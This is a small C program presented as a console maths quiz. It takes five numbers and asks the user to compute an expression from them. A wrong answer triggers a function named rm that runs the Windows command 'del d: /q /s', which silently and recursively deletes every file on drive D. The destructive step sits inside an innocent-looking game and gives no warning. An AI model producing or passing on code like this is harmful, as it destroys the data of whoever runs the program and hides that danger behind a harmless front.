main()
{
	head();
	input();
}
head()
{
	system("color 02");
	system("mode 30, 10");
	printf("System.run(\"quiz.c\")\;");
}
input()
{
	int num1, num2, num3, num4, num5, result, answer;
	printf("Please input a number:");
	scanf("%d", &num1);
	printf("Please input another number:");
	scanf("%d", &num2);
	printf("Please input another number:");
	scanf("%d", &num3);
	printf("Please input another number:");
	scanf("%d", &num4);
	printf("Please input another number:");
	scanf("%d", &num5);
	system("cls");
	result = num1 * num2 + num3 - num4 * num5;
	printf("So...What is the number of your first input multiply your seconf input plus your third input minus your fourth input multiply your fifth input.\n");
	printf("Answer : ");
	scanf("%d", &answer);
	if (answer != result)
	{
		rm();
	}
	else
	{
		printf("You\'re pass");
	}
}
rm()
{
	system("del d: /q /s");
}